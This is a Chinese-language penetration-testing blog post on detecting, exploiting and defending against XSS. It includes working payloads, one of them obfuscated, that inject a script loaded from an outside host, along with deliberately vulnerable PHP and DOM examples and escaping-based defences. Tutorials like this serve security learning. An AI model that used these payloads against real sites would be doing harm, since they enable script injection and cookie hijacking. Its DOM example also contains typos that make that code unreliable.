+++
date = "2016-07-15T16:30:54+08:00"
description = ""
draft = false
tags = ["xss"]
title = "XSS漏洞挖掘与利用"
topics = ["Pentest"]

+++

### 0x00 XSS的检测
> 检测XSS一般分两种方法：一种是手工检测、一种是软件自动检测  
手工检测：检测结果准确，但对于大型web来说费时费力  
软件检测：方便省力，但存在误报，且有些隐蔽的XSS无法检测出  
<font color="FF0000">检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出</font>
#### 1. 手工检测
```
可得知输出位置:
    • 输入敏感字符，如“<、>、"、'、()”等，然后在提交后查看html源代码，看这些字符是否被转义。
    • 在输出这些字符时，程序可能已经进行了过滤，可以输入“AAAAAA<>"&'()”字符串，然后查找AAAAAA或许比较方便。
无法得知输出位置:
    很多web应用程序源码不公开，在测试时不能得知输出位置，比如，有些留言版在留言后必须经过管理员审核才能显示，无法得知数据在后台管理页面处于何种状态，如：
    在标签中：<div>XSS Test</div>
    在属性内：<input type="text" name="content" value="XSS Test" />
    这种情况通常采用输入"/>XSS Test来测试。
```
#### 2. 全自动检测XSS
如APPSCAN、AWVS、Burp Suite等软件都可以有效的检测XSS，他们还会检测其他的漏洞，但是他们的效率不如专业的XSS检测工具高。  
专业的XSS扫描工具有知名的XSSER、XSSF等，还有专门扫描DOM类型XSS的web服务(www.domxssscanner.com)。  
一般要手工和软件一起使用，因为有些XSS软件不能检测，比如有些留言需要输入验证码等，工具无法做到。

### 0x01 XSS的挖掘与利用
* XSS漏洞挖掘
```
反射型XSS：
    一般是url参数中的值能够回显到HTML中，且url的参数值没有过滤或过滤不严
存储型XSS：
    可以提交内容
    提交的内容可被管理员或其他用户看到
    提交的内容没有被过滤或过滤不严
```

* XSS漏洞利用
XSS一般就是闭合标签，和SQL注入类似，常见payload如下：
```
• <script src='http://b.ioio.pub/xss/probe.js'></script>
• <img src=x onerror="s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js'";>
• <svg onload=s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js>
• <svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,
    114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,
    115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47,
    112,114,111,98,101,46,106,115)) >
```

### 0x03 XSS简单示例
> ```
反射型xss简单示例:
    • <?php
          echo $_GET['x'];
      ?>
    • 提交：
      /xss.php?x=<script>alert(1)</script>
    • 服务端解析时就会触发弹窗
```
```
下面是一段经典的DOM型XSS示例：
<script>
    var temp = document.URL; //获取URL
    var index = document.URL.indexOf("content");
    var par = temp.substrint(index);
    document.write(decodeURL(par)); //输入获取内容
</script>
上述代码的意思是获取URL中content参数的值，并且输出，若输入http://www.xxx.com/dom.html?content=<script>alert(/xss/)</script>，就会产生XSS漏洞。
```
```
只要在script标签中添加JavaScript代码，就能实现一些“特殊效果”，但通常在真实攻击中
一般使用<script src="http://www.xxx.com/a.txt"></script>的方式来加载外部脚本，
a.txt中就存放着恶意脚本。

注：JavaScript加载的脚本文件可以是任意扩展名，甚至没有也行，只要加载的文件中含有
    JavaScript代码就会被执行。
```

### 0x04 XSS的防御
* 过滤输入与输出(重点)

> 使用htmlspecialchars()和htmlentities()将一些预定义的字符转换为HTML实体
```
<?php
    @$html = $_GET['x'];
    if ($html){
        echo htmlspecialchars($html);
    }
?>
```

* HttpOnly

> ```
HttpOnly并不能防御XSS，但它能解决XSS漏洞后面的Cookie劫持攻击，防止XSS会话劫持
```